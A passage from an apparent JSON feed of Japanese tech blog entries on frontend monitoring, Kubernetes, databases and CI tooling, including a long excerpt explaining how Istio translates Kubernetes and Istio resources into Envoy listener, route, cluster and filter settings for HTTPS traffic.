Keigo","authorId":"kurita"},{"title":"フロントエンドで収集するべきテレメトリは何か","link":"https://zenn.dev/kimitsu/articles/frontend-and-telemetry","contentSnippet":"先日『フロントエンド監視の全体像と実現方法』という記事を投稿しましたが、その中でテレメトリについては触れませんでした（※本記事は上記記事の内容を知らなくても読み進められるようになっています）。というのは、テレメトリは可観測性を実現するための重要な概念ではあるものの、テレメトリを軸に監視を考えるのは手段の目的化になってしまうと考えているからです。重要なのはサービスにとって何を観測するべきかを考えることであり、テレメトリはそれを設計や実装に落とし込む際に現れるものです。一方で監視に対する理解を深める上では、テレメトリを軸に考えることも重要でしょう。そこで本記事ではフロントエンド監視に...","isoDate":"2024-02-11T01:40:25.000Z","dateMiliSeconds":1707615625000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"フロントエンド監視の全体像と実現方法","link":"https://zenn.dev/kimitsu/articles/frontend-monitoring","contentSnippet":"必要性フロントエンドの監視はバックエンドやインフラのそれらと比べ、優先度が低くなりがちです。バックエンドやインフラでの障害はサービス継続に直結するため、これは当然と言えば当然なのですが、別の理由もあると考えています。それは計算リソースをサービス提供側が管理していないことです。例えばアプリケーションがインフラとして AWS を利用しているなら、AWS のリソースを管理するのはサービス提供側です。これは AWS 以外のクラウドサービスプロバイダやオンプレであっても同様です。一方でフロントエンドはエンドユーザのブラウザ上で動作し、これを管理しているのはエンドユーザです。フロン...","isoDate":"2024-02-09T09:46:56.000Z","dateMiliSeconds":1707472016000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"安全な Kubernetes 環境を目指して","link":"https://speakerdeck.com/kyohmizu/an-quan-na-kubernetes-huan-jing-womu-zhi-site","contentSnippet":"Kubernetes Novice Tokyo #30 の登壇資料です。2024/02/08\\rhttps://k8s-novice-jp.connpass.com/event/300441/","isoDate":"2024-02-08T05:00:00.000Z","dateMiliSeconds":1707368400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"OWASP Top 10 for Large Language Model Applications をまとめる","link":"https://sreake.com/blog/owasp-top-10-for-llm-application/","contentSnippet":"はじめに Sreake 事業部インターン生の中林です。私は、Sreake 事業部長期インターン生として SRE 技術の技術検証を行っています。 今回は、Sreake 事業部で作成している LLM アプリケーションに対する […]The post OWASP Top 10 for Large Language Model Applications をまとめる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-02-05T09:29:32.000Z","dateMiliSeconds":1707125372000,"authorName":"Sreake","authorId":"Sreake"},{"title":"YugabyteDB ManagedのAlways Free枠を試そう","link":"https://zenn.dev/nnaka2992/articles/play_with_yugabytedb_managed_sandbox","contentSnippet":"YugabyteDB Managedにフリートライアルがあるのは知っていたのですが、期間が限られたものしか無いと思っていました。YugabyteDBについて調べごとをしていたら機能制限はあるもののSandboxクラスターというクレジットカード登録すら不要でAlways Freeな利用枠があることを知りました。いままでローカルでYugabyteDBを建てたりminikube上で遊んでいたのですが、簡単な検証であればSandboxクラスターで十分です。この記事ではそんなYugabyteDB ManagedのSandboxクラスターを紹介します。 Sandbox Clusterの制限...","isoDate":"2024-02-04T15:02:28.000Z","dateMiliSeconds":1707058948000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"renovate で CircleCI の terraform_version を更新する","link":"https://blog.1q77.com/2024/02/update-terraform-version-in-circleci-with-renovate/","contentSnippet":"課題Circle CI の terraform Orb でterraform の version を指定するには次のようにしますが、この terraform_version の値に変数を使うことが出来ず、tf ファイルや .tool-versions から読み出した値を使うことが出来ませんでした。","isoDate":"2024-02-04T10:37:36.000Z","dateMiliSeconds":1707043056000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Controllerを作ってみよう~ Kubernetes Controllerハンズオン ~","link":"https://speakerdeck.com/bells17/controllerwozuo-tutemiyou-kubernetes-controllerhansuon","contentSnippet":"イベントURL: https://k8s-novice-jp.connpass.com/event/300442/\\r参考リポジトリ: https://github.com/bells17/k8s-controller-example\\r\\rその他リンク:\\r\\rhttps://github.com/kubernetes/sample-controller\\rhttps://github.com/kubernetes/kubernetes/blob/v1.29.1/pkg/controller/clusterroleaggregation/clusterroleaggregation_controller.go\\rhttps://github.com/kubernetes/client-go/tree/v12.0.0\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/reflector.go\\rhttps://github.com/kubernetes/client-go/tree/v12.0.0/informers\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/store.go\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/delta_fifo.go\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/util/workqueue/rate_limiting_queue.go","isoDate":"2024-01-30T05:00:00.000Z","dateMiliSeconds":1706590800000,"authorName":"bells17","authorId":"bells17"},{"title":"Mac に Homebrew で docker pluings をインストールする","link":"https://blog.1q77.com/2024/01/install-docker-plugins-on-mac/","contentSnippet":"Homebrew で plugin をインストールDocker Desktop for Mac であれば何もしなくても docker compose コマンドは使えるようになっているのですが、Lima で docker を使っている場合などで Homebrew で docker をインストールしていると docker compose や docker buildx を使えるようにするためには追加でのインストールが必要でした。","isoDate":"2024-01-26T12:36:56.000Z","dateMiliSeconds":1706272616000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"限定公開のGKE上でセキュアなGithub Actionsのrunnerを構築","link":"https://zenn.dev/kojake_300/articles/7be501d3fc4e72","contentSnippet":"モチベーションGithub Actionsのセルフホストランナーでは、long pollingによりrunner側でingressのfirewallを設定せずにrunnerをデプロイ出来るというのを最近知ったので、GKEで検証していこうと思います。 構成ざっくりですがこんな感じ。GKEは限定公開のクラスタとして構築し、踏み台サーバからGKEにリクエストを送ります。Github Actionsとの通信のためにVPCにはCloud NATをアタッチします。 前提条件terraformで構築するため、予めインストールしておくこと。(検証はv1.0.0) 構築手順...","isoDate":"2024-01-24T11:08:37.000Z","dateMiliSeconds":1706094517000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"K8sGPT: Prometheus Analyzers","link":"https://zenn.dev/tozastation/articles/71015cc5b95b4e","contentSnippet":"v0.3.26 からPrometheus の Analyzer がリリースされましたデモ映像はこちらhttps://github.com/k8sgpt-ai/k8sgpt/pull/855本PR作成者の Daniel Clark さんは Google の方 (2024/01/18時点)で，prometheus-engine (Cloud Managed Service for Prometheus (GMP)) に多くのコントリビューションをされています． 先にまとめPrometheus Analyzer には現在二つの機能が含まれるConfig Analyzer ...","isoDate":"2024-01-23T03:00:00.000Z","dateMiliSeconds":1705978800000,"authorName":"tozastation","authorId":"tozastation"},{"title":"openssl s_client で SMTP 認証","link":"https://blog.1q77.com/2024/01/smtp-auth-plain-with-openssl-command/","contentSnippet":"Amazon SES での SMTP 認証情報の確認をしたいAmazon SES で SMTP を使ってメール送信したい場合、IAM User の credentials をちょいと加工してやる必要があります。Amazon SES SMTP 認証情報を取得","isoDate":"2024-01-23T02:44:23.000Z","dateMiliSeconds":1705977863000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"【Istio⛵️】Istioによって抽象化されるEnvoyのHTTPSリクエスト処理の仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/01/16/013404","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのサイドカーメッシュを題材にしたEnvoyの設定の抽象化について様々なサービスメッシュツール (特に、Istio、Consul、Ciliumなど) でも流用できるEnvoyの知識についてこの記事から得られる知識01. はじめに02. 様々なリソースによるEnvoy設定の抽象化サービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS03. istio-proxyコンテナによるHTTPS処理Istioコントロールプレーンの仕組みサービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS04. EnvoyによるHTTPS処理Envoyの設定の種類フィルターフィルターの一覧フィルターチェーンの仕組み05. リソースの設定からEnvoy設定への翻訳各リソースとEnvoyの設定の関係一覧サービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるマイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるサービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめる06. 翻訳されたEnvoy設定値を見てみるEnvoyの現在の設定を出力するリスナーを出力するルートを出力するクラスターを出力するエンドポイントを出力する証明書を出力するサービスメッシュ外からのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナマイクロサービス間のHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナサービスメッシュ外へのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナ07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、俺 (REMIX) feat. Istioニキ a.k.a. いすてぃ男です。Istioは、Envoyを使用したサービスメッシュを実装します。IstioがKubernetesリソースやIstioカスタムリソースに基づいてEnvoyの設定を抽象化してくれるため、開発者はEnvoyをより簡単に設定できます。Envoyの設定の抽象化は、Envoyを使用したサービスメッシュ (例：Istioサイドカーメッシュ/アンビエントメッシュ、Consul、Istioから得られた学びを土台に登場したCiliumサイドカーフリーメッシュなど) に共通しています。つまり、次々に登場するEnvoyによるサービスメッシュツールに振り回されないようにするためには、ツールがどのようにEnvoyを抽象化するのかを理解しておく必要があります。そこで今回は、IstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのかを解説します。また、抽象化されたEnvoyがHTTPSリクエストを処理する仕組みも一緒に解説します。これらの知識は、様々なサービスメッシュツールで流用できるはずです。それでは、もりもり布教していきます\uD83D\uDE1702. 様々なリソースによるEnvoy設定の抽象化まずは、どのようなリソースがHTTPSリクエストの処理に関係しているのかを、HTTPSリクエストの方向に分けて解説していきます。istio-proxyコンテナやEnvoyについては、次章以降で解説します。サービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| Gateway    Gateway([⛵️ Gateway]) -.-> VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。もちろん、クラスター外からIstio IngressGateway PodにHTTPリクエストを送信するために、Service (例：NodePort Service) が必要です。Istio IngressGateway Podは、宛先Podとの間で相互TLS認証を実施します。Istio IngressGateway Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineeringマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、宛先Podとの間で相互TLS認証を実施します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。https://www.zhaohuabing.com/post/2018-09-25-istio-traffic-management-impl-intro/▶︎ サービスメッシュ内のPod間通信にkube-proxyは必要なのかistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます (本記事3章参照) 。これにより、送信元Podから宛先Podに直接通信できるようになります。Tracing network path in Istio. Istio is among the most widely used… | by Bikram Gupta | Mediumサービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。複数のVirtualServiceとDestinationが登場するため、これらには便宜上 X と Y をつけています。flowchart TD    送信元 -.->|HTTPS| VirtualServiceX    VirtualServiceX([⛵️ VirtualService X]) -.-> DestinationRuleX    DestinationRuleX([⛵️ DestinationRule X]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.-> Gateway    Gateway([⛵️ Gateway]) -.-> VirtualServiceY    VirtualServiceY([⛵️ VirtualService Y]) -.-> DestinationRuleY    DestinationRuleY([⛵️ DestinationRule Y]) -.-> ServiceEntry    ServiceEntry([⛵️ ServiceEntry]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualServiceX,VirtualServiceY,DestinationRuleX,DestinationRuleY,Service,Endpoints,ServiceEntry blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、HTTPSリクエストの宛先がServiceEntryでエントリ済みか否かの設定に応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、送信元PodはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、送信元PodはHTTPSリクエストの宛先に外のシステムを選択します。送信元Podは、Istio EgressGateway Podとの間で相互TLS認証を実施します。(1) で宛先がエントリ済であったとします。送信元Podは、HTTPSリクエストの向き先をIstio EgressGateway Podに変更します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、Istio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Podは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio▶︎ Istio EgressGatewayの必要性についてistio-proxyコンテナを経由せずに外部システムに直接HTTPSリクエストを送信できるようになってしまい、システムの安全性が低くなります。他に、サービスメッシュ外への特定の通信を識別できるようになるメリットもあります。Istio / Accessing External ServicesIstioldie 1.10 / Egress Gateway Performance Investigation03. istio-proxyコンテナによるHTTPS処理前章では、KubernetesリソースやIstioカスタムリソースによって抽象化されたEnvoyまで言及しませんでした。本章では、解説をもう少し具体化します。Istioは、Envoyプロセスを持つistio-proxyコンテナを作成します。このistio-proxyコンテナを使用してどのようにHTTPSリクエストを処理しているのかを、HTTPSリクエストの方向に分けて解説します。Envoyの設定については、次章以降で解説します。Istioコントロールプレーンの仕組みEnvoyの設定を抽象化する責務を担うのは、Istioコントロールプレーン (discoveryコンテナ) です。Istioコントロールプレーンは異なる責務を担う複数のレイヤーから構成されています。レイヤー名      責務    Config ingestionレイヤー            kube-apiserverからKubernetesリソースやIstioカスタムリソースの設定を取得します。Istioの初期から名前は変わっていません。          Config translationレイヤー                   リソースの設定をEnvoy設定に変換します。Istioの初期ではConfig Data Modelレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          Config servingレイヤー            Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。Istioの初期では、Proxy Servingレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          図中の番号に沿って、Istioコントロールプレーンの仕組みを解説します。Config ingestionレイヤーにて、 Istioコントロールプレーンはkube-apiserverにHTTPSリクエストを送信します。ここで、KubernetesリソースやIstioカスタムリソースの設定を取得します。Config translationレイヤーにて、取得したリソースの設定をEnvoyの設定に変換します。Config servingレイヤーにて、Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。双方向ストリーミングRPCのため、istio-proxyコンテナがConfig servingレイヤーにリクエストを送信し、これらを取得することもあります。istio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHub一文带你彻底厘清 Isito 中的证书工作机制-赵化冰的博客 | Zhaohuabing Blog▶︎ Config servingレイヤーにあるXDS-APIについて▶︎ Istioカスタムリソースのコントローラーについてistio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHubサービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。もちろん、クラスター外からIstio IngressGateway PodにHTTPリクエストを送信するために、Service (例：NodePort Service) が必要です。Istio IngressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio IngressGateway Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。Istio IngressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ Pod内のiptablesについてistio-proxyコンテナを経由するように、istio-proxyコンテナにリクエストをリダイレクトします。iptablesのルールを書き換えるのはistio-initコンテナです。Istioは、istio-proxyコンテナと同じタイミングで、istio-initコンテナをPodにインジェクションします (Istio IngressGatewayとIstio EgressGatewayのPodは除きます)。画像引用元：SoByteistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます。また、istio-initコンテナはルールを書き換えた後に終了するため、Podの起動後にPod内に残りません\uD83D\uDC4D\uD83C\uDFFB$ istio-iptables \\\\    -p 15001 \\\\    -z 15006 \\\\    -u 1337 \\\\    -m REDIRECT \\\\    -i * \\\\    -x \\\\    -b * \\\\    -d 15090,15020Sidecar injection, transparent traffic hijacking, and routing process in Istio explained in detail | by Jimmy Song | MediumIstio / pilot-agent▶︎ Istio IngressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio IngressGateway Podにインジェクションしません。つまり、Istio IngressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。https://www.zhaohuabing.com/post/2018-09-25-istio-traffic-management-impl-intro/サービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。この時、ServiceEntryで宛先がエントリ済みか否かに応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、istio-proxyコンテナはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、istio-proxyコンテナはHTTPSリクエストの宛先に外のシステムを選択します。ここでは、宛先がエントリ済であったとします。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストをIstio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio EgressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。▶︎ Istio EgressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio EgressGateway Podにインジェクションしません。つまり、Istio EgressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBUsing Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio04. EnvoyによるHTTPS処理前章では、istio-proxyコンテナ内のEnvoyの設定まで、言及しませんでした。本章では、もっと具体化します。EnvoyがHTTPSリクエストを処理する仕組みを解説します。Envoyの設定の種類HTTPSリクエストを処理する場合、Envoyの設定が以下の順で紐付き、HTTPSリクエストを送信元から宛先まで届けます。flowchart TD    送信元 -.->|HTTPS| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター      ネットワークフィルター(ネットワークフィルター) -.-> HTTPフィルター    end    HTTPフィルター(HTTPフィルター) -.-> ルート    ルート(ルート) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|HTTPS| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,HTTPフィルター,ルート,クラスター,エンドポイント red各処理がどのような責務を担っているのかをもう少し詳しく見てみましょう。図中の番号に沿って、EnvoyがHTTPSリクエストを処理する仕組みを解説します。送信元からのHTTPSリクエストの宛先ポートで、リスナーを絞り込みます。通信の種類 (例：HTTP、HTTPS、TCP、UDP、Unixドメインソケットなど) に応じてフィルターを選び、各フィルターがパケットのヘッダーを処理します。もしHTTPSであれば、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。フィルターを使用して、HTTPSリクエストの宛先ポートで、ルートを絞り込みます。フィルターを使用して、HTTPSリクエストの宛先ホストやパスで、クラスターを絞り込みます。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、クラスター配下のエンドポイントを選びます。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、エンドポイントにL7ロードバランシングします。Life of a Request — envoy 1.34.0-dev-997cab documentation▶ TCPリクエストを処理する場合についてflowchart TD    送信元 -.->|TCP| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター    end    ネットワークフィルター(ネットワークフィルター) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|TCP| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,クラスター,エンドポイント redDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTフィルターフィルターの一覧Envoyのフィルターは、Envoyの機能を拡張するための設定です。HTTPSリクエストを処理するためには、リスナーフィルター、ネットワークフィルター、HTTPフィルター、といったフィルターが必要になります。全ては解説しきれないため、HTTPSリクエストを処理するための代表的なフィルターをいくつか抜粋しました。ただ、 Istioはこれらのフィルターをデフォルトで有効にしてくれている ため、開発者がEnvoyのフィルターを設定する場面は少ないです。逆をいえば、Istioを介さずにEnvoyをそのまま使用する場合、開発者がEnvoyのフィルターを自前で設定する必要があります\uD83D\uDC4D\uD83C\uDFFBフィルターの種類      HTTPSリクエストの処理に必要なフィルター(一部抜粋)      説明    リスナーフィルター      Original Destination      istio-proxyコンテナへのリダイレクト前の宛先情報をEnvoyが取得できるようにします。Pod内のiptablesがHTTPSリクエストをistio-proxyコンテナにリダイレクトすると、HTTPSリクエストの宛先がistio-proxyコンテナに変わってしまいます。ただし、iptablesはリダイレクト前の宛先をカーネル上のSO_ORIGINAL_DSTという定数に格納してくれています。Envoyは、カーネル上のSO_ORIGINAL_DSTから本来の宛先を取得し、プロキシします。    HTTP Inspector      EnvoyがHTTPを検知できるようにします。    TLS Inspector      EnvoyがTLSを検知できるようにします。TLSを検知した場合、EnvoyはTLSに関する処理を実行します。例えば、DownstreamTlsContextは、リスナーフィルター直後に、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。また、UpstreamTlsContextは、クラスターの処理時に、宛先との間でTLS接続を確立し、L7のアプリケーションデータを暗号化します。    ネットワークフィルター      HTTP connection manager      Envoyが、L7のアプリケーションデータを読み取り、また後続のHTTPフィルターを制御できるようにします。    HTTPフィルター      Router      Envoyがポート番号でルート、ホストやパスでクラスターを絞り込めるようにします。    gRPC-Web      EnvoyがHTTP/1.1で受信したHTTPSリクエストをHTTP/2に変換し、gRPCサーバーにプロキシできるようにします。    Filters — envoy 1.34.0-dev-997cab documentation▶︎ Istioがデフォルトで有効にするEnvoyの設定についてistio-proxyコンテナは、イメージのビルド時に、あらかじめ用意しておいたEnvoyの設定ファイルを組み込みます。そのため、istio-proxyコンテナ内のEnvoyは、多くの設定をデフォルトで有効にできます。Istioを利用する開発者が、EnvoyがHTTPSリクエストを処理するために必要なフィルターを有効にしなくてよいのも、Istioのおかげです。Istioほんまにありがとな\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F  istio/pilot/docker/Dockerfile.proxyv2 at 1.20.2 \xb7 istio/istio \xb7 GitHubistio/tools/packaging/common/envoy_bootstrap.json at 1.20.2 \xb7 istio/istio \xb7 GitHubフィルターチェーンの仕組みEnvoyは、複数のフィルターからなるフィルターチェーンを実行し、HTTPSを処理します。図中の番号に沿って、Envoyのフィルターチェーンの仕組みを解説します。各フィルターの機能は、前述したフィルターの一覧を参考にしてください\uD83D\uDE47\uD83C\uDFFBリスナーフィルター (Original Destination、HTTP Inspector、TLS Inspectorなど) を実行します。(1) でTLS InspectorがTLSを検知した場合、DownstreamTlsContextで宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。ネットワークフィルター (HTTP connection managerなど) を実行します。HTTPフィルター (Router、gRPC-Webなど) を実行します。Life of a Request — envoy 1.34.0-dev-997cab documentation▶ TCPリクエストを処理する場合についてTCP proxy — envoy 1.34.0-dev-997cab documentation05. リソースの設定からEnvoy設定への翻訳いよいよです\uD83D\uDD25Istioが各リソースをいずれのEnvoyの設定に翻訳しているのかを解説します。表で対応関係の一覧を示した後、istio-proxyコンテナ内のEnvoyに当てはめました。各リソースとEnvoyの設定の関係一覧Istioコントロールプレーンは、KubernetesリソースやIstioカスタムリソースの設定をEnvoyの設定に翻訳し、処理の流れに当てはめます。以下の通り、各リソースがいずれのEnvoyの設定を抽象化するのかを整理しました。リソースによっては、Envoyの複数の設定を抽象化します。なお、Istioの用意したEnvoyのフィルターのデフォルト値を変更するユースケースが少ないため、これを抽象化するEnvoyFilterについては言及しません。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          Debugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPT- YouTubeサービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ外からのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio IngressGatewayの一部として使用します。ServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅            \xd7      ✅    ルート      ✅                  ✅            \xd7          クラスター      ✅                        ✅      \xd7      ✅    エンドポイント            ✅                  ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes 